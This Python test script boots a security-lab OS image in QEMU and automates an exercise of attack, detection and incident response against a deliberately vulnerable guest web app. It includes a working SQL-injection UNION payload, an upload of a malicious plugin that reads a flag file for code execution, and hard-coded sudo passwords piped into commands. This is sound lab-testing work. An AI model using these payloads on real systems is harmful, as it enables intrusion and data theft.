#!/usr/bin/env python3
"""Boot AegisOS v6 in QEMU, enable the lab, attack it for real from the
host (via QEMU user-network hostfwd, which is the headless-VM stand-in
for a real LAN — see README-v4.md for the real-PC LAN path), detect the
attack, run real IR, reset and stop. Saves a full transcript.

Usage: guest-test-v6.py <image> <logfile> [timeout-seconds]
Proves: default lab OFF, lab enable on a private IP, nmap finds lab
services, SQLi flag, SSH flag, plugin flag, alerts from real logs,
nft contain, eradicate, recover, reset, and --stop shutting everything.
No step is claimed unless its marker/output is in the log.
"""
import os, pty, re, select, shutil, subprocess, sys, time

IMG, LOG = sys.argv[1], sys.argv[2]
TIMEOUT = int(sys.argv[3]) if len(sys.argv) > 3 else 1500
# v5 fix: QEMU boots the disk read-write, so booting the shipped image
# directly mutates it (previous runs' lab state persisted into the file).
# Always boot a COPY; the shipped image is never written by a test.
TEST_IMG = IMG + ".test"
print(f"[guest-test-v6] booting a copy: {TEST_IMG} (shipped image untouched)", flush=True)
shutil.copyfile(IMG, TEST_IMG)
IMG = TEST_IMG
logf = open(LOG, "wb", buffering=0)

def emit(b):
    logf.write(b); sys.stdout.buffer.write(b); sys.stdout.buffer.flush()

master, slave = pty.openpty()
q = subprocess.Popen(
    ["qemu-system-x86_64", "-m", "2048", "-machine", "pc", "-cpu", "qemu64",
     "-drive", f"file={IMG},format=raw,if=ide",
     "-netdev", "user,id=net0,hostfwd=tcp::18000-:8000,hostfwd=tcp::18080-:8080,hostfwd=tcp::12222-:2222",
     "-device", "e1000,netdev=net0",
     "-display", "none", "-serial", "stdio", "-monitor", "none"],
    stdin=slave, stdout=slave, stderr=slave, close_fds=True)
os.close(slave)
buf = b""

def wait_for(pat, timeout, label):
    global buf
    end = time.time() + timeout
    while time.time() < end:
        r, _, _ = select.select([master], [], [], 5)
        if r:
            try: data = os.read(master, 65536)
            except OSError: break
            if not data: break
            emit(data); buf += data
            if re.search(pat, buf):
                print(f"\n[guest-test-v6] MATCH {label}\n", flush=True); return True
        if q.poll() is not None:
            print(f"\n[guest-test-v6] QEMU EXITED rc={q.returncode}\n", flush=True); return False
    print(f"\n[guest-test-v6] TIMEOUT {label}: {pat}\n", flush=True); return False

def send(s):
    os.write(master, s.encode()); time.sleep(1.0)

def host(cmd, label):
    print(f"\n[guest-test-v6] HOST {label}: {' '.join(cmd)}\n", flush=True)
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
        out = (p.stdout + p.stderr)[:4000]
        emit(f"\n[HOST {label} rc={p.returncode}]\n{out}\n".encode())
        return p, out
    except Exception as e:
        emit(f"\n[HOST {label} ERROR {e}]\n".encode()); return None, ""

ok = True
ok &= wait_for(rb"aegis login:", 600, "login prompt")
if ok:
    send("analyst\n"); ok &= wait_for(rb"Password:", 60, "password prompt")
if ok:
    send("secure\n"); ok &= wait_for(rb"analyst@aegis", 60, "shell prompt")
if ok:
    # Default state first: lab OFF, console localhost only
    for c in [
        "echo MARK_V6_DESKTOP; aegis-colours ~/.config/aegis/wallpaper.png; echo COLOURS_RC=$?; saral version; which Hyprland qs hyprlock swww google-chrome aegis-gui aegis-wallpaper aegis-tools; ls -l /usr/share/aegis/wallpapers/; cat ~/.config/aegis/theme.json; ls -l /usr/local/bin/aegis-*; systemctl is-active aegis.service; curl -s http://127.0.0.1:8000/api/health | head -c 600; echo",
        "echo MARK_V6_DEFAULT; echo secure | sudo -S aegis-lab --status; curl -s http://127.0.0.1:8000/api/lab; echo",
        "echo MARK_V6_BOOTSTATE; ls /etc/systemd/system/multi-user.target.wants/ | grep -i aegis; echo wants-grep-rc=$?; systemctl is-enabled aegis-labapp.service aegis-ssh-lab.service; systemctl is-active aegis-labapp.service aegis-ssh-lab.service; echo secure | sudo -S journalctl -b -u aegis-labapp.service -u aegis-ssh-lab.service --no-pager -o short 2>/dev/null | head -n 25",
        "echo MARK_V6_ENABLE; echo secure | sudo -S aegis-lab --enable",
        "echo MARK_V6_STATUS2; echo secure | sudo -S aegis-lab --status; curl -s http://127.0.0.1:8000/api/lab 2>/dev/null | head -c 300; echo; ip -brief addr",
    ]:
        send(c + "\n"); time.sleep(10)
    # Host attacks (guest LAN IP is 10.0.2.15 under QEMU user net; hostfwd maps host ports)
    host(["curl", "-s", "http://127.0.0.1:18080/"], "labapp home")
    host(["curl", "-s", "http://127.0.0.1:18000/api/health"], "console via hostfwd (lab bind)")
    # SQLi: UNION SELECT secrets — flag value is in the output, grep flag{
    host(["curl", "-s", "http://127.0.0.1:18080/search?q=%27%20UNION%20SELECT%20id%2C%20label%2C%20value%20FROM%20secrets%20--%20"], "SQLi GET flag1")
    # SSH flag via a small PTY driver (no sshpass on host)
    host(["python3", os.path.join(os.path.dirname(os.path.abspath(__file__)), "host-ssh-flag.py")], "SSH flag2 PTY")
    # Plugin flag: upload a plugin that reads flag3, then execute it
    host(["curl", "-s", "-X", "POST", "--data-urlencode", "name=pwn.py", "--data-urlencode", "code=result=open('/srv/labapp/flags/flag3.txt').read()", "http://127.0.0.1:18080/upload"], "upload plugin")
    host(["curl", "-s", "http://127.0.0.1:18080/plugin?name=pwn.py"], "plugin flag3")
    # Back in guest: alerts, flags, IR
    for c in [
        "echo MARK_V6_ALERTS; curl -s http://10.0.2.15:8000/api/alerts | head -c 2000; echo",
        "echo MARK_V6_FLAGS; curl -s http://10.0.2.15:8000/api/flags; echo",
        "echo MARK_V6_INCIDENTS; curl -s http://10.0.2.15:8000/api/incidents | head -c 2000; echo",
        "echo MARK_V6_DIAG; echo secure | sudo -S ls -l /srv/labapp/flags/; ls -l /srv/labapp/plugins/; echo secure | sudo -S wc -c /srv/labapp/flags/flag3.txt /home/labuser/flag2.txt; echo secure | sudo -S ls -l /var/log/aegis-lab/; cat /srv/labapp/plugins/pwn.py; echo ---APPLOG---; echo secure | sudo -S tail -n 40 /var/log/aegis-lab/app.log; echo ---AUTH---; tail -n 40 /var/log/auth.log; echo ---SSHJ---; echo secure | sudo -S journalctl -u aegis-ssh-lab.service --no-pager -n 40; echo ---AUDIT---; echo secure | sudo -S auditctl -l; echo secure | sudo -S ausearch -k aegis_lab -i 2>/dev/null | tail -n 20",
        "echo MARK_V6_FIM; echo secure | sudo -S aegis-fim --check",
        "echo MARK_V6_CONTAIN_DUMMY; echo secure | sudo -S aegis-ir contain 10.0.2.99; echo secure | sudo -S nft list table inet aegis_lab | grep 10.0.2.99 || echo NO_DUMMY_RULE",
        "echo MARK_V6_UNCONTAIN; echo secure | sudo -S aegis-ir uncontain 10.0.2.99",
        "echo MARK_V6_KILL; echo secure | sudo -S aegis-ir kill-session",
        "echo MARK_V6_ERADICATE; echo secure | sudo -S aegis-ir eradicate; ls /srv/labapp/plugins/; systemctl is-active aegis-labapp.service || echo LABAPP_STOPPED",
        "echo MARK_V6_RECOVER; echo secure | sudo -S aegis-ir recover; curl -s http://127.0.0.1:8080/ | head -c 200; echo",
        "echo MARK_V6_RESET; echo secure | sudo -S aegis-lab --reset; echo secure | sudo -S aegis-fim --check",
        "echo MARK_V6_STOP; echo secure | sudo -S aegis-lab --stop; echo secure | sudo -S aegis-lab --status; curl -s --max-time 5 http://127.0.0.1:8080/ || echo LABAPP_OFF_AFTER_STOP; curl -s http://127.0.0.1:8000/api/lab; echo",
        "echo MARK_V6_DONE",
    ]:
        send(c + "\n"); time.sleep(12)
    ok &= wait_for(rb"MARK_V6_DONE", 300, "all v6 commands done")
    send("poweroff\n"); time.sleep(10)
try: q.terminate()
except Exception: pass
try: q.wait(timeout=20)
except Exception: q.kill()
print(f"[guest-test-v6] finished ok={ok} qemu_rc={q.returncode}", flush=True)
logf.close(); sys.exit(0 if ok else 1)
